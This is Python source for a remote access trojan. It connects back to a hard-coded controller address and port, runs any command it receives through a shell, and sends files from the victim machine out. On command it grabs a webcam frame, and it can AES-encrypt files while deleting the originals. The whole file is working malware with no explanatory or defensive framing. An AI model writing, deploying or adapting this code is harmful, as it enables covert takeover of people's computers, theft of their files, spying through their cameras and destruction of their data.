import os
import cv2
import time
import socket
import random
import subprocess
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


def socket_create():
    """
    The function creates socket (allows two computers to connect)


    :return: None
    """
    try:
        global host
        global port
        global s
        host = '192.168.0.171'
        # host = get_lan_ip()
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_connect():
    """
    The function connects to a remote socket


    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.connect((host, port))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))
        time.sleep(5)
        socket_connect()


def send_file(file_path):
    """
    The function sends a file to the server

    :param file_path: The path of the file we want to send
    :type file_path: str

    :return: None
    """
    f = open(str(file_path), 'rb')
    print 'Sending...'
    file_conn = f.read(20480)
    while file_conn:
        print 'Sending...'
        s.send(file_conn)
        file_conn = f.read(20480)
    f.close()
    print "Done Sending"
    output_str = "The file was sent" + "\n"
    s.send(str.encode(output_str + str(os.getcwd()) + '> '))


def receive_commands():
    """
    The function receives commands from the socket

    :return: None
    """
    while True:
        data = s.recv(20480)
        command = data.decode("utf-8")
        command_with_data = command.split()
        if data[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass
        if data[:].decode("utf-8") == 'quit':
            s.close()
            break
        if data.decode("utf-8") == 'list':
            output_str = "Command not recognized" + "\n"
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        elif len(data) > 0:
            # File transfer
            # """
            if data[:8].decode("utf-8") == 'transfer':
                file_name = data[9:].decode("utf-8")
                file_path = str(os.getcwd()) + chr(92) + file_name
                if not os.path.exists(file_path):
                    output_str = "The file does not exist" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                else:
                    try:
                        send_file(file_path)
                    except:
                        output_str = "Could not transfer the file" + "\n"
                        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                        print(output_str)

            # """
            # The rest of commands

            elif command_with_data[0] == 'encrypt':
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    encrypt(get_key(password), file_name, file_path)
                    output_str = "File encrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not encrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            elif command_with_data[0] == 'decrypt':
                file_name = command_with_data[1]
                file_path = str(os.getcwd()) + chr(92) + file_name
                password = command_with_data[2]
                try:
                    decrypt(get_key(password), file_name, file_path)
                    output_str = "File decrypted" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Could not decrypt the file" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
            elif data.decode("utf-8").__contains__('show camera'):
                video = cv2.VideoCapture(0)
                check, frame = video.read()
                ddd = frame.flatten()
                sss = ddd.tostring()
                s.send(sss)

            else:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes)
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print output_str
                except:
                    output_str = "Command not recognized" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
    s.close()


def get_key(password):
    """
    The program gets a password and coverts it to something we can use
    to encrypt

    :param password: The users picked password
    :type password: str

    :return: a password we can use in encryption
    """
    hasher = SHA256.new(password).digest()
    return hasher


def encrypt(key, filename, file_path):
    """
    The function encrypts the file given

    :param key: The encryption key

    :param filename: The name of the file to encrypt
    :type filename: str

    :param file_path: The path of the file to encrypt
    :type file_path: str

    :return: None
    """
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) + "(encrypted)" + filename
    file_size = str(os.path.getsize(file_path)).zfill(16)
    iv = ""

    for i in range(16):
        iv += chr(random.randint(0, 0xFF))
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as infile:
        with open(output_file, 'wb') as output_file:
            output_file.write(file_size)
            output_file.write(iv)

            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))

                output_file.write(encryptor.encrypt(chunk))
    os.remove(file_path)


def decrypt(key, filename, file_path):
    """
    The function decrypts the file given

    :param key: The decryption key

    :param filename: The name of the file to encrypt
    :type filename: str

    :param file_path: The path of the file to encrypt
    :type file_path: str

    :return: None
    """
    chunk_size = 64 * 1024
    output_file = str(os.getcwd()) + chr(92) + filename[11:]

    with open(file_path, 'rb') as infile:
        file_size = long(infile.read(16))
        iv = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, iv)
        with open(output_file, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)

                if len(chunk) == 0:
                    break

                outfile.write(decryptor.decrypt(chunk))
            outfile.truncate(file_size)
    os.remove(file_path)


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()


if __name__ == '__main__':
    main()
